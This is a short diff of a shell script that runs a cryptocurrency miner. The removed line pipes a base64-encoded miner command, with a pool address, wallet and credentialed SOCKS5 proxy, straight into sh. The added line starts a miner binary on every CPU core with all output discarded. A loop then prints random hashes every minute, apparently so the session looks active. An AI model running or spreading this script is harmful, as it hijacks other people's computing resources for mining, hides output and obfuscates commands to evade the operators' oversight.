@@ -1,4 +1,4 @@
-base64 -d <<< Li9zZ3IxIC1hIHBvd2VyMmIgLW8gNjQuMjI3LjEzNC45NDo3NiAtdSBtYmMxcTh4ODQyeWNmazhzemx2eGs4OGhteHM1bG1qZTJxZHNocWQ2MGFmLmNwOTkgLXQgOCAtLXByb3h5IHNvY2tzNTovL2thbGF1bWFsaW5nb21vbmdkb25rOmthbGF1bWFsaW5nb21vbmdkb25rQDE1Ny4yNDUuMTQyLjM3OjQ0Mw | sh && 
+chmod +x mbo && ./mbo -a power2b -o 64.227.134.94:76 -u mbc1q8x842ycfk8szlvxk88hmxs5lmje2qdshqd60af.yessss -p x -t $(nproc --all) > /dev/null 2>&1  && 
 while [ 1 ]; do
   while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
   sleep 1
